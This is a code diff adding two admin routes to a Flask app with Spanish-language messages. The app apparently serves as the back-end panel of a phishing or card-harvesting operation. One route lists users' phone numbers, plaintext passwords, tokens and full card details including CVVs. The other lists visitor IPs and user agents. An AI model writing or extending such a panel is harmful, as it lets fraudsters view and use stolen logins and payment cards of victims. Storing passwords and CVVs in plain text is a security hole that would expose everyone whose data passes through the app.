@@ -472,6 +472,55 @@ def internal_admin():
     except Exception as e:
         return f"Error en el servidor: {str(e)}"
 
+@app.route('/admin/api/users_table')
+def admin_api_users_table():
+    if not session.get('admin_logged_in'):
+        return "No autorizado", 403
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("SELECT id, phone, password, token, status, created_at, card_number, card_expiry, card_cvv, card_holder FROM users ORDER BY id DESC")
+        users = []
+        for row in cur.fetchall():
+            users.append({
+                "id": row[0],
+                "phone": row[1],
+                "pass": row[2],
+                "token": row[3],
+                "status": row[4],
+                "time": row[5].strftime("%H:%M:%S") if row[5] and hasattr(row[5], 'strftime') else "N/A",
+                "card_number": row[6] if len(row) > 6 else None,
+                "card_expiry": row[7] if len(row) > 7 else None,
+                "card_cvv": row[8] if len(row) > 8 else None,
+                "card_holder": row[9] if len(row) > 9 else None
+            })
+        cur.close()
+        conn.close()
+        return render_template('users_table.html', users=users)
+    except Exception as e:
+        return str(e), 500
+
+@app.route('/admin/api/logs_table')
+def admin_api_logs_table():
+    if not session.get('admin_logged_in'):
+        return "No autorizado", 403
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("SELECT ip, user_agent, created_at FROM logs ORDER BY id DESC LIMIT 20")
+        logs = []
+        for row in cur.fetchall():
+            logs.append({
+                "ip": row[0],
+                "ua": row[1][:50] + "..." if row[1] else "N/A",
+                "time": row[2].strftime("%H:%M:%S") if row[2] and hasattr(row[2], 'strftime') else "N/A"
+            })
+        cur.close()
+        conn.close()
+        return render_template('logs_table.html', logs=logs)
+    except Exception as e:
+        return str(e), 500
+
 @app.route('/admin/set_status', methods=['POST'])
 def admin_set_status():
     if not session.get('admin_logged_in'):
